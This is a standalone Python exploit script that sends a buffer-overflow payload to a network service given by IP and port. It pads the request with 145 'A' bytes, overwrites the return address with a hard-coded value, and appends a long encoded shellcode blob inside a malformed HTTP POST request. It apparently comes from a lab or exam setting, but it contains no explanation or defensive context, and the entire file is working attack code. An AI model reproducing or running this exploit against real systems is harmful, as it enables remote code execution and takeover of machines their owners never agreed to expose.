#!/usr/bin/python3

import socket
import sys

def main(argv):
    ip = argv[0]
    port = argv[1]
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((str(ip), int(port)))

    payload =  b""
    #payload += b"\x90\x90\x90\x90\x90\x90\x90\x90"
    payload += b"\x6a\x4a\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73"
    payload += b"\x13\x91\xe3\x21\x1d\x83\xeb\xfc\xe2\xf4\x6d\x0b"
    payload += b"\xae\x1d\x91\xe3\x41\x94\x74\xd2\xf3\x79\x1a\xb1"
    payload += b"\x11\x96\xc3\xef\xaa\x4f\x85\xec\x96\x57\xb7\x68"
    payload += b"\x53\x35\xa0\x1c\x10\xdd\x3d\xdf\x40\x61\x93\xcf"
    payload += b"\x01\xdc\x5e\xee\x20\xda\xd8\x96\xce\x4f\x1a\xb1"
    payload += b"\x31\x96\xd3\xdf\x20\xcd\x1a\xa3\x59\x98\x51\xb4"
    payload += b"\x55\x51\x90\x33\x71\x96\xd9\xfb\xaa\x45\xb1\xe2"
    payload += b"\xf2\x98\x58\x97\x1d\x2c\x6e\xaa\xaa\x29\x1a\xe2"
    payload += b"\xf7\x2c\x51\x22\xee\x10\x3d\xe2\xe6\x25\x71\x96"
    payload += b"\xd5\x1e\xec\x1b\x1a\x60\xb5\x96\xc1\x45\x1a\xbb"
    payload += b"\x05\x1c\x42\x85\xaa\x11\xda\x68\x79\x01\x90\x30"
    payload += b"\xaa\x19\x1a\xe2\xf1\x94\xd5\xc7\x05\x46\xca\x82"
    payload += b"\x78\x47\xc0\x1c\xc1\x45\xce\xb9\xaa\x0f\x78\x63"
    payload += b"\xde\xe2\x6e\xbe\x49\x2e\xa3\xe3\x21\x75\xe6\x90"
    payload += b"\x13\x42\xc5\x8b\x6d\x6a\xb7\xe4\xa8\xf5\x6e\x33"
    payload += b"\x99\x8d\x90\xe3\x21\x34\x55\xb7\x71\x75\xb8\x63"
    payload += b"\x4a\x1d\x6e\x36\x4b\x17\xf9\x23\x89\x2c\x44\x8b"
    payload += b"\x23\x1d\x90\x58\xa8\xfb\xc1\xb3\x71\x4d\xd1\xb3"
    payload += b"\x61\x4d\xf9\x09\x2e\xc2\x71\x1c\xf4\x8a\xfb\xf3"
    payload += b"\x77\x4a\xf9\x7a\x84\x69\xf0\x1c\xf4\x98\x51\x97"
    payload += b"\x2d\xe2\xdf\xeb\x54\xf1\xf9\x13\x94\xbf\xc7\x1c"
    payload += b"\xf4\x77\x91\x89\x25\x4b\xc6\x8b\x23\xc4\x59\xbc"
    payload += b"\xde\xc8\x1a\xd5\x4b\x5d\xf9\xe3\x31\x1d\x91\xb5"
    payload += b"\x4b\x1d\xf9\xbb\x85\x4e\x74\x1c\xf4\x8e\xc2\x89"
    payload += b"\x21\x4b\xc2\xb4\x49\x1f\x48\x2b\x7e\xe2\x44\xe2"
    payload += b"\xe2\x34\x57\x96\xcf\xde"

    junk = b"A" * 145
    eip = b"\x63\x14\x70\x77"
    print(junk+eip+payload)
    more_junk = b"B"*372
    s.send(b"POST / HTTP/1.1\n\r" + junk + eip + payload)
    #s.send("POST / HTTP/1.1\n\r".encode() + junk + eip + payload)
    #s.send(junk + eip + payload)
    print(s.recv(1024))
    s.close() 


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"[*] Usage: {sys.argv[0]} TARGET IP {sys.argv[1]} TARGET PORT")
        sys.exit(1)
    main(sys.argv[1:])
